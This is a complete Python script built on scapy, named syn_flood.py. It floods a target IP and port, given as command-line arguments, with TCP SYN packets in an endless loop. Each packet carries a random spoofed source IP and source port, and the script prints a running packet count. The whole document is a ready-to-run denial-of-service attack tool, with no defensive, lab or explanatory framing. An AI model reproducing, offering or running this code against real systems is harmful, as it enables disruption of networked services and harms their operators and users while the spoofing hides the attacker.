from scapy.all import *
import sys

def syn_flood(target_ip, target_port):
    packet_count = 0
    while True:
        # Generate a random source IP and source port
        src_ip = RandIP()  # Random source IP
        src_port = RandShort()  # Random source port
        # Create the SYN packet
        syn_packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(syn_packet, verbose=False)
        packet_count += 1
        print(f"Sent {packet_count} packets to {target_ip}:{target_port}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 syn_flood.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    syn_flood(target_ip, target_port)
